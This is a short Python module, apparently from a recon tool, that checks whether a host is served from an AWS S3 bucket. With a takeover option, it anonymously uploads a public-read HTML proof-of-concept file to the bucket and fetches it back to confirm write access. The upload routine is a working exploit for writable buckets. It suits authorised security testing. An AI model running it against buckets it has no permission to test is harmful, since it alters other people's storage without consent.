from io import StringIO
import requests
from colorama import Fore
import boto3
from botocore import UNSIGNED
from botocore.config import Config
from urllib3.exceptions import InsecureRequestWarning 
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



upload_name = 'domainker_aws_poc.html'
upload_body = """<html>
<!-- DOMAINKER_TAKEOVER(This is a vuln host) -->
</html>"""

def tkaws(bucket):
	s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
	try:
		s3.put_object(Bucket=bucket, Key=upload_name,ACL='public-read', Body=StringIO(unicode(upload_body)).read())
		response = requests.get("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)).content
		if upload_body in response:
			return "%sFile uploaded and accessable %s->%s %s" %(
						Fore.GREEN,
						Fore.YELLOW,
						Fore.LIGHTWHITE_EX,
						("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)
					))
		else:
			return "%sFile uploaded and not accessable" %(Fore.BLUE)

	except Exception as e:
		if "Access Denied" in str(e):
			return "%sAccess Denied" %(Fore.RED)
		else:
			return e



def chkaws(bucket,takeover,timeout=60):
	try:
		aws = requests.head("http://%s.s3.amazonaws.com" % bucket,timeout=timeout)
		if aws.status_code == 404:
			return '%sNot hosted on AWS' % (Fore.RED)
		
		if takeover:
			return tkaws(bucket)
		else:
			return '%sHosted on AWS %s-> %s%s' % (Fore.GREEN,Fore.YELLOW,Fore.LIGHTWHITE_EX,"http://%s.s3.amazonaws.com" % bucket)

	except Exception as e:
		pass
